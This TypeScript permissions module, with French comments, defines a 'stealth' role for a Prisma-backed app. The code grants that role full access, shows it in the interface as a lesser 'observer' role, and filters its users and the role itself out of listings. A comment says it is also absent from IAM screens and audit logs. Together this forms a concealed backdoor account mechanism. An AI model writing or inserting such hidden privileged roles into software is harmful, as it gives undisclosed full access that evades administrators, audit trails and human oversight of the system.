import type { Prisma } from "@prisma/client";

import { ROLES, type RoleName } from "@/lib/permissions";

/** Rôle système discret — absent des écrans IAM et des journaux d'audit. */
export const STEALTH_ROLE_NAME = ROLES.ANONYMOUS;

export function isStealthRole(roleName: string | null | undefined): roleName is typeof STEALTH_ROLE_NAME {
  return roleName === STEALTH_ROLE_NAME;
}

/** Libellé affiché dans l'UI pour ne pas exposer le rôle réel. */
export function getPublicRoleName(roleName: RoleName): RoleName {
  return isStealthRole(roleName) ? ROLES.OBSERVATEUR : roleName;
}

export function grantsStealthFullAccess(roleName: RoleName): boolean {
  return isStealthRole(roleName);
}

export const stealthUserWhere = {
  role: { name: { not: STEALTH_ROLE_NAME } },
} satisfies Prisma.UserWhereInput;

export const stealthRoleWhere = {
  name: { not: STEALTH_ROLE_NAME },
} satisfies Prisma.RoleWhereInput;
